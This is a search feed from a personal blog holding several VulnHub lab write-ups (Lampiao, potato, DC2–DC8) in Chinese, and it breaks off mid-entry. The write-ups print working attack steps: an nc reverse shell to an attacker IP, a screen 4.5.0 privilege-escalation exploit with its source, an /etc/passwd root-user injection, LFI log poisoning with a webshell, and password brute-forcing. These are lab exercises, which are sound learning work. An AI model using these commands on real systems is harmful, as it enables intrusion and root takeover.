<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>vulnhub-Lampiao</title>
      <link href="/2020/11/25/vulnhub-Lampiao/"/>
      <url>/2020/11/25/vulnhub-Lampiao/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描靶机IP，以及靶机的端口，此靶场的开放端口会有点特殊，只看到了22端口和8端口，打开80端口，发现什么也没有，<br><img src="/2020/11/25/vulnhub-Lampiao/1.png" alt><br>觉得应该像之前的做过的靶场一样有端口我们没有扫描出来，所以我用nmap再次扫描发现了一个不一样的端口<br><img src="/2020/11/25/vulnhub-Lampiao/2.png" alt><br>打开1898界面，发现是个博客，利用dirb扫描一下博客，<br><img src="/2020/11/25/vulnhub-Lampiao/3.png" alt><br>发现了robots.txt这个敏感文件，访问一下，看看有没有什么能用信息，同时也看一下网站的具体信息，<br><img src="/2020/11/25/vulnhub-Lampiao/4.png" alt></p><h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>发现是drapul7版本的博客，我们在web页面没有什么能够利用的渗透点，索性就从系统入手，在klai中找一下能够利用的exp<br><img src="/2020/11/25/vulnhub-Lampiao/5.png" alt><br>我们利用18年这个攻击模块，（由于7版本是比较新的博客版本，之前的漏洞可能已经打好了补丁），设置好RHOST和RPORT，然后exploit，拿到shell，然后利用python实现交互式shell。<br><img src="/2020/11/25/vulnhub-Lampiao/6.png" alt></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>既然我们已经拿到了www-data用户的权限，那么我们接下来就是想着怎么去提权，利用uname -a的命令查看系统版本，<br><img src="/2020/11/25/vulnhub-Lampiao/7.png" alt><br>发现此版本为Ubuntu在16年8月的版本，所以我们难免会想到一个著名的Linux“老年”漏洞：脏牛。既然我们知道怎样去提权了，那么接下来就好办了，（再打这个靶场之前，我连脏牛是啥都不知道，草率了），所以我去看了别人的脏牛提权教程，发现此靶场利用的是40847.cpp，我们search一波就发现了<br><img src="/2020/11/25/vulnhub-Lampiao/8.png" alt><br>所以将exp上传到靶机上，我们先在kali上开启临时web服务，上传exp</p><pre class=" language-shell"><code class="language-shell">python -m SimpleHTTPServer   //kali开启临时web服务</code></pre><p><img src="/2020/11/25/vulnhub-Lampiao/9.png" alt><br><img src="/2020/11/25/vulnhub-Lampiao/10.png" alt></p><pre class=" language-shell"><code class="language-shell">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil                       //exp编译语句</code></pre><p>将exp上传到靶机上之后，由于是cpp文件比较特殊，编译的语句确实很长（我实在看不同编译的shell命令，还是太菜了），成功将exp编译为可执行的文件，然后执行文件，最后得到root权限，拿到了flag。<br><img src="/2020/11/25/vulnhub-Lampiao/11.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-potato(SunCSR)</title>
      <link href="/2020/11/21/vulnhub-potato-SunCSR/"/>
      <url>/2020/11/21/vulnhub-potato-SunCSR/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描一波，找到靶机的IP，<br><img src="/2020/11/21/vulnhub-potato-SunCSR/1.png" alt><br>直接IP打开80端口页面，发现除了一张土豆照片之外什么也没有，所以觉得可能会有其他端口开启了但没有被扫描到，所以，利用nmap再扫描一次，看到了开起了7120端口，而且利用了TCP协议，我在看了别人的wp之后了解到靶机将ssh服务转接到了7120端口。<br><img src="/2020/11/21/vulnhub-potato-SunCSR/2.png" alt></p><h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>所以我尝试连接一下发现了确实是一个ssh端口，但是我没有登录的账号密码，所以只能利用被人的wp，得到账号为potato，密码为letmein（主要是我的九头蛇出问题了，还有就是没有字典），登录上之后，我们相当于一个游客的权限。<br><img src="/2020/11/21/vulnhub-potato-SunCSR/3.png" alt></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>在登陆上之候，sudo一下发现并没有文件我们是可以以root权限执行的，所以就只能从系统漏洞着手了，发现这是一个版本为3.13.0的Ubuntu。（很老的版本了）<br><img src="/2020/11/21/vulnhub-potato-SunCSR/7.png" alt><br>在kali中寻找一下该系统的exp，将37292.c保存到/var/www/html目录下，<br><img src="/2020/11/21/vulnhub-potato-SunCSR/4.png" alt><br>然后开启web服务。</p><pre class=" language-shell"><code class="language-shell">python -m SimpleHTTPServer  //kali开启web服务wget http://192.168.10.207:8000/wdnmd.c  //靶机下载exp</code></pre><p><img src="/2020/11/21/vulnhub-potato-SunCSR/5.png" alt><br>靶机从kali上下载exp，将39272利用gcc命令转变一下文件格式，从c文件转换为文件，（我背这一步卡了好长时间，最后看了c文件中给的提示才知道怎么操作）然后执行，拿到了root权限，拿到了flag。</p><pre class=" language-shell"><code class="language-shell">gcc wdnmd.c -o wdnmd    /文件格式转换./wdnmd            /执行文件，提权</code></pre><p><img src="/2020/11/21/vulnhub-potato-SunCSR/6.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC8</title>
      <link href="/2020/11/17/vulnhub-DC8/"/>
      <url>/2020/11/17/vulnhub-DC8/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老规矩，扫描一波IP地址，发现靶机的IP和开放端口，靶机开放了80和22端口，推测我们又要从80端口开始渗透<br><img src="/2020/11/17/vulnhub-DC8/1.png" alt></p><h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>进入靶机的80页面之后发现是一个博客页面，随便点点，发现URL会发生变化，<br><img src="/2020/11/17/vulnhub-DC8/2.png" alt><br>看着挺像做SQL注入时的靶场，所以，测试一下SQL注入，<br><img src="/2020/11/17/vulnhub-DC8/3.png" alt><br>我在这里猜测一下这个SQL漏洞的原理，对于URL中GET到的数据没有做出防护而且默认给我们会自动加上’进行闭合，而我们如果输入语句进行闭合那么之后的语句不会被执行。而且这里只有三个字段名，所以我们在nid后的数字只要不填123就可以注入<br><img src="/2020/11/17/vulnhub-DC8/4.png" alt><br><img src="/2020/11/17/vulnhub-DC8/5.png" alt><br><img src="/2020/11/17/vulnhub-DC8/6.png" alt><br><img src="/2020/11/17/vulnhub-DC8/7.png" alt><br>所以利用SQL注入拿数据库名，表名，字段名，用户名和密码</p><p>然后启用kali中的john开始对得到的密码进行暴力破解，最后可以得到john的密码（admin的密码就别想了），<br><img src="/2020/11/17/vulnhub-DC8/8.png" alt><br>得到john的密码为turtle，本来我想用ssh连接但最后失败了，所以就只能把注意力转到80页面，登录一波，（登录页面可以通过查看rebots.txt来查看），登录john的账号，<br>看看有没有什么值得注意的地方，最后发现，这个博客支持PHP语言，<br><img src="/2020/11/17/vulnhub-DC8/9.png" alt></p><h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>所以对页面进行写入反弹shell的PHP代码（原本试了一句话木发现不行），kali监听端口，然后利用pyhton实现交互式shell，<br><img src="/2020/11/17/vulnhub-DC8/10.png" alt><br>再查看当前用户的权限，最后发现，在/usr/bin/exim4当前用户具有较高的权限，<br><img src="/2020/11/17/vulnhub-DC8/11.png" alt><br>在kali中searchsploits一下发现了，不少漏洞，我看了别人的wp之后，发现46996是用的最频繁的（主要是它自身就是一个脚本），<br><img src="/2020/11/17/vulnhub-DC8/12.png" alt><br>把46996转换成unix支持的文件格式要不然执行的时候会报错（我被这一步卡了好久，心态炸裂），<br><img src="/2020/11/17/vulnhub-DC8/13.png" alt><br>然后在kali上开启web服务，将脚本下载到靶机上（最好是/tmp下，我在其他目录下发现www-data用户没有权限），</p><pre class=" language-shell"><code class="language-shell">python -m SimpleHTTPServer     //kali开启http服务的命令wget http://1921.168.1.210/12138.sh   //从kali中下载脚本</code></pre><p><img src="/2020/11/17/vulnhub-DC8/14.png" alt><br><img src="/2020/11/17/vulnhub-DC8/15.png" alt><br><img src="/2020/11/17/vulnhub-DC8/16.png" alt><br>给脚本权限之后运行，就可以拿到root权限，最后拿到flag，</p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC7</title>
      <link href="/2020/11/14/vulnhub-DC7/"/>
      <url>/2020/11/14/vulnhub-DC7/</url>
      
        <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>在配置好vulnhub-DC7之后我们在他的虚拟机界面能够直接看到他的IP地址，然后根据我们之前的套路，直接用IP地址访问，可你看到80界面。同时也顺便扫一下靶机的端口，可以看到，开启了22端口，说明我们会拿到某些用户的账号和密码。</p><p><a href="https://imgchr.com/i/DPMnIS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMnIS.png" alt></a><br>我根据网上看到wp，发现关键在于@DC7USER，也就是我们在靶机80页面的页脚，百度搜一手，发现是个github用户。<br><a href="https://imgchr.com/i/DPMQ2j" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMQ2j.png" alt></a><br><a href="https://imgchr.com/i/DPMtaT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMtaT.png" alt></a></p><h1 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h1><p>用户的公共仓库中有网站的部分源码，下载后在config.php中发现了用户名和密码，利用ssh连接一手。<br><a href="https://imgchr.com/i/DPMNIU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMNIU.png" alt></a><br><a href="https://imgchr.com/i/DPMaiF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMaiF.png" alt></a><br>cat一下该用户目录下的两个文件，发现有一个打不开，另外一个是一个邮件，而且，我们在这个邮件的前半部分发现了一个路径，<br><a href="https://imgchr.com/i/DPMwRJ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMwRJ.png" alt></a><br>cd一手发现没有什么提示，<br><a href="https://imgchr.com/i/DPMxQs" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMxQs.png" alt></a><br>再查看一下该文件的权限，发现一个奇怪的东西，这个文件root具有最高权限，但是它所属的是www-data组，也就是说这可能会是我们的一个提权的点。</p><p>那么接下来就需要我们想办法去将自己变为www-data，然而到这里我是真的感觉抓瞎，在看了别人的wp之后发现drush是drupal站点专门用来管理自己网站的shell，也就是说我们可以在网站的根目录下修改网站用户的密码，然后cd到网站根目录下操作<br><a href="https://imgchr.com/i/DPQCwV" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQCwV.png" alt></a><br>我们在修改过admin的密码之后从靶机的80页面登录，然后进入后台。<br><a href="https://imgchr.com/i/DPQeyR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQeyR.png" alt></a><br>这时候我感觉又抓瞎了，然后就双快乐一下别人的wp，发现这个网站本身是不支持PHP语言的，但是drupal有支持PHP的插件，所以我们可以到下面的地址中下载压缩包<br><a href="https://www.drupal.org/project/php" target="_blank" rel="noopener">https://www.drupal.org/project/php</a></p><p>在下载完成之后去靶机80页面的后台进行如下操作<br><a href="https://imgchr.com/i/DPQtOI" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQtOI.png" alt></a><br><a href="https://imgchr.com/i/DPQa0P" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQa0P.png" alt></a><br><a href="https://imgchr.com/i/DPQBtS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQBtS.png" alt></a><br><a href="https://imgchr.com/i/DPQDfg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQDfg.png" alt></a><br><a href="https://imgchr.com/i/DPQspQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQspQ.png" alt></a><br>然后install</p><h1 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h1><p>然后我们就可以使用PHP语言类，然后进入网站后台，编辑一下主页面，加入一句话木马<br><a href="https://imgchr.com/i/DPQvtO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQvtO.png" alt></a><br>蚁剑连接，反弹shell，实现交互式shell</p><p><a href="https://imgchr.com/i/DPllBq" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPllBq.png" alt></a><br><a href="https://imgchr.com/i/DPltCF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPltCF.png" alt></a></p><p>刚才我们发现了/opt/scripts/backups.sh这个文件是一个提权的点，所以我叒看了别人的wp，发现这确实是一个提权的点，原理是，这是原本是一个备份文件，而root用户每隔一段时间就会指向这个文件里边的命令，所以我们一www-data用户向这个文件中写入反弹shell的命令，kali中监听端口，而我们只要等待root用户下一次执行这个文件就可以拿到root用户的权限了。<br><a href="https://imgchr.com/i/DPlhDI" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPlhDI.png" alt></a><br><a href="https://imgchr.com/i/DPl4bt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPl4bt.png" alt></a></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulnhub-DC4</title>
      <link href="/2020/11/12/vulnhub-DC4/"/>
      <url>/2020/11/12/vulnhub-DC4/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>配好vulnhub-DC4的靶场之后，开始扫描同网段存活主机，发现靶机开起来80和22端口，猜测我们接下来可能会用到爆破拿到相关的用户名和密码。</p><p><a href="https://imgchr.com/i/BzH49f" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzH49f.png" alt></a></p><h1 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h1><p>然后访问靶机的80页面，发现是个登录框，一开始我认为是存在SQL注入漏洞，后来在看了别热的wp之后发现是利用爆破得到登录的账号和密码（账号一般都为admin），所以，利用burp的爆破板块开始爆破，后来发现用到的字典是在太大，爆破的时间太长，所以只好看了别人的wp，得到admin的密码为happy。</p><p>然后我们通过admin进入页面，发现是一个类似远程命令执行的页面，</p><p><a href="https://imgchr.com/i/BzH538" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzH538.png" alt></a></p><p><a href="https://imgchr.com/i/BzHojg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzHojg.png" alt></a></p><p>验证一波能否执行远程命令</p><p><a href="https://imgchr.com/i/BzHONq" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzHONq.png" alt></a></p><p>二话不说，直接抓包改数据反弹shell。</p><p><a href="https://imgchr.com/i/BzbFER" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzbFER.png" alt></a></p><p>kali中监听端口，然后开启交互式shell。</p><p><a href="https://imgchr.com/i/BzbRr4" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzbRr4.png" alt></a></p><h1 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h1><p>我根据别人缩写wp看到了在/home/jim/backups的文件夹中有一个old-passwords的文件，cat一下，发现了一些有用的东西</p><p><a href="https://imgchr.com/i/BzqgYt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzqgYt.png" alt></a></p><p>将文件中的密码copy一下，然后利用九头蛇以jim用户的身份（因为这是在jim用户的文件夹下，多半是jim用户的密码文件）连接靶机的ssh端口，最后成功爆破出来，密码为jibril04。</p><p><a href="https://imgchr.com/i/BzLKAA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzLKAA.png" alt></a></p><p>通过ssh登录，接下来就是进一步的提权了</p><p><a href="https://imgchr.com/i/BzLdNn" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzLdNn.png" alt></a></p><p>我们在ls一下后发现有一个mbox的文件，cat一下，发现这类似一个邮件，</p><p><a href="https://imgchr.com/i/BzOxo9" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzOxo9.png" alt></a></p><p>于是我们到/var/mail这个默认邮件地址查看一手，发现有一个jim的邮件</p><p><a href="https://imgchr.com/i/BzXdS0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzXdS0.png" alt></a></p><p>cat一下发现了charles的密码为^xHhA&amp;hvim0y</p><p><a href="https://imgchr.com/i/BzXTTH" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzXTTH.png" alt></a></p><p>直接用charles的账号通过ssh连接靶机</p><p><a href="https://imgchr.com/i/BzjmBF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzjmBF.png" alt></a></p><p>然后利用产看此用户的权限，可以看到我们在teehee中是不需要root用户的密码就可以执行root的权限，所以这就是一个提权的点，</p><p><a href="https://imgchr.com/i/BzjcDS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzjcDS.png" alt></a></p><p>然后构造提权的语句</p><pre class=" language-shell"><code class="language-shell">echo "fake::0:0:::/bin/bash" | sudo teehee -a /etc/passwd        //利用我们在teehee中的权限向/etc/passwd中加入一个具有root权限的名为fake的用户</code></pre><p><a href="https://imgchr.com/i/BzvCDO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzvCDO.png" alt></a></p><p>然后切换用户成功提权，拿到flag</p><p><a href="https://imgchr.com/i/BzvVPA" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/12/BzvVPA.png" alt></a></p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulbhub-DC5</title>
      <link href="/2020/11/11/vulbhub-DC5/"/>
      <url>/2020/11/11/vulbhub-DC5/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="阶段一：信息收集"><a href="#阶段一：信息收集" class="headerlink" title="阶段一：信息收集"></a>阶段一：信息收集</h1><p>我们在配置好靶场文件之后运行靶场，利用namp发现靶机开启了80和111端口，</p><p><a href="https://imgchr.com/i/BvA8Jg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvA8Jg.png" alt></a></p><p>111端口的用处如下：</p><p>111端口是baiSUN公司的RPC服务du所有端口，常见RPC服务有rpc.mountd、NFS、rpc.statd、rpc.csmd、rpc.ttybd、amd。（摘自百度知道，虽然我也不知道这些服务是干啥的），总而言之，我们对这个靶场的渗透还是从80端口开始的，通过IP访问，可以访问到以下界面</p><p><a href="https://imgchr.com/i/BvADFU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvADFU.png" alt></a></p><p>在看过每个页面之后，我门可以发现我们在contact处在点击提交之后，会发现相仿Copyright的标志会发生变化，在看过别人的wp之后知道这里存在一个文件包含，所以直接测试一波，</p><p><a href="https://imgchr.com/i/BvAcl9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAcl9.png" alt></a></p><p>可以看到确实存在文件包含，所以再利用文件包含查看源代码具体看一下是怎样的包含，将显示出的字符串base64解密一下，</p><p><a href="https://imgchr.com/i/BvAIYD" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAIYD.png" alt></a></p><h1 id="阶段二：前渗透阶段"><a href="#阶段二：前渗透阶段" class="headerlink" title="阶段二：前渗透阶段"></a>阶段二：前渗透阶段</h1><p><a href="https://imgchr.com/i/BvAqOI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAqOI.png" alt></a></p><p>可以看到这里对于文件包含并没有做出防护措施，所以直接利用这个漏洞来包含一句话木马</p><p><a href="https://imgchr.com/i/BvAztS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvAztS.png" alt></a></p><p>在包含之后再利用包含查看服务器端的日志文件</p><pre><code>http://192.168.1.170/thankyou.php?file=/var/log/nginx/access.log</code></pre><p><a href="https://imgchr.com/i/BvEQXR" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvEQXR.png" alt></a></p><p>日志记录已经包含成功</p><p><a href="https://imgchr.com/i/BvEZkT" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvEZkT.png" alt></a></p><p>利用蚁剑连接</p><p><a href="https://imgchr.com/i/BvE30x" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvE30x.png" alt></a></p><p>在执行反弹shell</p><pre class=" language-shell"><code class="language-shell">nc  -e  /bin/bash  192.168.1.170    7744           //反弹shell到7744端口</code></pre><p><a href="https://imgchr.com/i/BvEOgJ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvEOgJ.png" alt></a></p><p>在接受到反弹shell之后利用python实现交互式shell</p><pre class=" language-shell"><code class="language-shell">nc -lvvp 7744                       //端口监听python -c 'import pty;pty.spawn("/bin/bash")'         //实现交互式shell</code></pre><p><a href="https://imgchr.com/i/BvVpE6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/11/BvVpE6.png" alt></a></p><h1 id="阶段三：后渗透阶段"><a href="#阶段三：后渗透阶段" class="headerlink" title="阶段三：后渗透阶段"></a>阶段三：后渗透阶段</h1><p>在拿到shell之后我们就要想到怎么提权了，先利用命令查看能够执行root权限的文件，</p><pre class=" language-shell"><code class="language-shell">find / -perm /4000 2>/dev/null</code></pre><p><a href="https://imgchr.com/i/BvVfPO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVfPO.png" alt></a></p><p>发现了screen4.5.0，然后在msf中search一波，发现有screen4.5.0的exp，</p><p><a href="https://imgchr.com/i/BvVbZt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVbZt.png" alt></a></p><p>copy一手41154.sh，再cat一下，（41154.sh是不能直接进行编译的）</p><p>这里我看了很wp最后发现是需要我们创建两个c语言文件，然后将这两个文件进行编译之后产生的新文件通过蚁剑上传到靶机，其中libhax.c的代码如下：</p><p><a href="https://imgchr.com/i/BvVjJS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvVjJS.png" alt></a></p><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token function">__attribute__</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>__constructor__<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">void</span> <span class="token function">dropshell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">chown</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token string">"/tmp/rootshell"</span><span class="token punctuation">,</span> <span class="token number">04755</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"/etc/ld.so.preload"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] done!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后命令行上执行：</p><pre class=" language-shell"><code class="language-shell">gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></pre><p>rootshell.c的代码如下：</p><p><a href="https://imgchr.com/i/BvZ9Ln" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZ9Ln.png" alt></a></p><pre class=" language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">setuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setgid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">seteuid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setegid</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">execvp</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>然后执行以下命令：</p><pre class=" language-shell"><code class="language-shell">gcc -o rootshell rootshell.c</code></pre><p>注意：这两个文件一定要进行编译，而在进行编译之后会产生两个同名的文件，而我们真正的提权工具就是这两个新产生的文件。</p><p>然后将两个文件通过蚁剑上传到靶机上的/tmp下，</p><p><a href="https://imgchr.com/i/BvZid0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZid0.png" alt></a></p><p>然后在我们的交互式shell窗口cd到/tmp/etc下执行以下命令：</p><pre class=" language-shell"><code class="language-shell">cd /tmp/etc                    //转到tmp下的etc文件中umask 000                       screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"           //构造exp/tmp/rootshell          //实现提权</code></pre><p><a href="https://imgchr.com/i/BvZVWF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/11/BvZVWF.png" alt></a></p><p>然后进入到root目录下查看flag</p>]]></content>
      
      
      <categories>
          
          <category> web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulbhub-DC2</title>
      <link href="/2020/11/05/vulbhub-DC2/"/>
      <url>/2020/11/05/vulbhub-DC2/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><p>在布置好靶场之后我们利用相关工具进行一波内网扫描，我这里用的是自己找的扫描软件，可以推荐用nmap，</p><p><a href="https://imgchr.com/i/Bfgrp6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/Bfgrp6.png" alt></a></p><p>在扫描出相应的IP地址之后直接访问发现访问不了，治理是由于我们本地的解析问题，需要我们对host文件进行更新，Windows下是在C:\Windows\System32\drivers\etc中的host文件中进行更新，在更新完成之后我们可以直接访问靶场页面。</p><p><a href="https://imgchr.com/i/Bfgvhq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/Bfgvhq.png" alt></a></p><p>打开之后发现是wordpress4.7.10版本的博客，可以发现flag1。</p><p><a href="https://imgchr.com/i/Bf2wDg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/Bf2wDg.png" alt></a></p><h1 id="2-用户收集和尝试爆破"><a href="#2-用户收集和尝试爆破" class="headerlink" title="2.用户收集和尝试爆破"></a>2.用户收集和尝试爆破</h1><p>提示让我们使用cewl，所以我们首先用wpscan扫描网站的用户命令如下：</p><pre class=" language-shell"><code class="language-shell">wpscan --url dc-2 --enumerate u</code></pre><p><a href="https://imgchr.com/i/Bf2c80" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/Bf2c80.png" alt></a></p><p>可以看到有admin，jerry，Tom三个用户，在flag1中提示使用cewl，这是一个kali中用于爬取指定URL指定深度的ruby应用，然后将所爬取的内容通过指令输出到指定的文件夹中，在这个靶场中我们用到的命令如下：</p><pre class=" language-shell"><code class="language-shell">cewl -w pwd.txt dc-2       将爬取的内容输出到pwd.txt文件中cat pwd.txt            顺便查看一下爬取结果wpscan --url dc-2 -P pwd.txt -U admin         爆破admin的密码，不用想了肯定爆破不出来wpscan --url dc-2 -P pwd.txt -U jerry             爆破jerry的密码，这个是可以得到的wpscan --url dc-2 -P pwd.txt -U tom               爆破tom的密码，这个也可以得到</code></pre><p><a href="https://imgchr.com/i/BfR9PI" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfR9PI.png" alt></a></p><p><a href="https://imgchr.com/i/BfRKGq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/11/06/BfRKGq.png" 